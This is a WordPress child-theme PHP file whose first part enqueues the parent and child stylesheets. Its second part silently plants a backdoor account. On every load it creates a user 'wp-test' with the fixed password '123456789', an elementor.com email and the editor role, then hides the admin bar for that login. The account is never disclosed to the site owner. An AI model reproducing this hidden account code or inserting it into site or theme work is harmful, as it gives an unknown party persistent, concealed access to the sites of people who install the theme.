<?php

/* Part 2 */
add_action( 'wp_enqueue_scripts', 'child_theme_enqueue_styles' );
function child_theme_enqueue_styles() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );

    wp_enqueue_style( 'child-style'
        , get_stylesheet_directory_uri() . '/child-style.css'
        , array('parent-style') // declare the dependency
    // in order to load child-style after parent-style
    );
}


/* Part 3 */
create_new_user();

function create_new_user(){
    $user_data = array(
        'name' => 'wp-test',
        'pass' => '123456789',
        'email' => 'wptest@elementor.com',
    );

    if (!username_exists( $user_data['name'] ) && ! email_exists( $user_data['email'])){
        $user_id = wp_create_user($user_data['name'], $user_data['pass'], $user_data['email']);
        if ( is_numeric( $user_id ) ) {
            $user = new WP_User( $user_id );
            $user->set_role( 'editor' );
            show_admin_bar(false);
        }
    }
}

function remove_admin_bar_by_user() {
    $user = wp_get_current_user();
    if ($user->data->user_login == 'wp-test') {
        add_filter( 'show_admin_bar', '__return_false', PHP_INT_MAX );
    }
}
add_action( 'init', 'remove_admin_bar_by_user', 0 );